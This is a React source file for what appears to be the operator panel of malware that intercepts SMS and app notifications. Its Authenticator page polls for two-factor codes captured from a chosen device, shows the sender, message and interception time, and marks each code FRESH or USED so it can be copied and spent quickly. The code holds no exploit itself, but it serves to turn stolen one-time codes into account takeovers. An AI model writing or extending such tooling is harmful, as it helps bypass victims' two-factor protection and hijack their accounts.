import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { tfa } from '../utils/api'
import { Shield, Copy, Check } from 'lucide-react'

export default function AuthenticatorPage() {
  const { deviceId } = useParams()
  const [codes, setCodes] = useState([])
  const [copied, setCopied] = useState(null)

  useEffect(() => {
    loadCodes()
    const interval = setInterval(loadCodes, 3000)
    return () => clearInterval(interval)
  }, [deviceId])

  const loadCodes = async () => {
    const data = deviceId ? await tfa.list(deviceId) : await tfa.latest()
    if (data) setCodes(data)
  }

  const copyCode = (code, id) => {
    navigator.clipboard.writeText(code)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  const columns = [
    { key: 'code', label: 'Code', render: (row) => (
      <span className="font-mono text-lg text-wuzen-primary font-bold tracking-wider">{row.code}</span>
    )},
    { key: 'source_app', label: 'Source App' },
    { key: 'source_number', label: 'From Number' },
    { key: 'message', label: 'Message', render: (row) => (
      <span className="text-xs text-wuzen-muted truncate max-w-[200px] block">{row.message}</span>
    )},
    { key: 'intercepted_at', label: 'Time', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.intercepted_at).toLocaleTimeString()}</span>
    )},
    { key: 'used', label: 'Status', render: (row) => (
      <span className={`text-xs px-2 py-1 rounded ${row.used ? 'bg-wuzen-muted/20 text-wuzen-muted' : 'bg-wuzen-success/10 text-wuzen-success'}`}>
        {row.used ? 'USED' : 'FRESH'}
      </span>
    )},
    { key: 'actions', label: '', render: (row) => (
      <div className="flex gap-2">
        <button onClick={() => copyCode(row.code, row.id)} className="p-1 rounded hover:bg-wuzen-card text-wuzen-primary">
          {copied === row.id ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
        </button>
        {!row.used && (
          <button onClick={() => tfa.markUsed(row.id).then(loadCodes)} className="px-2 py-1 rounded text-xs bg-wuzen-success/10 text-wuzen-success hover:bg-wuzen-success/20">
            Mark Used
          </button>
        )}
      </div>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Authenticator" icon={Shield} onDeviceChange={() => {}} />
      <DataTable columns={columns} data={codes} keyField="id" searchable />
    </div>
  )
}
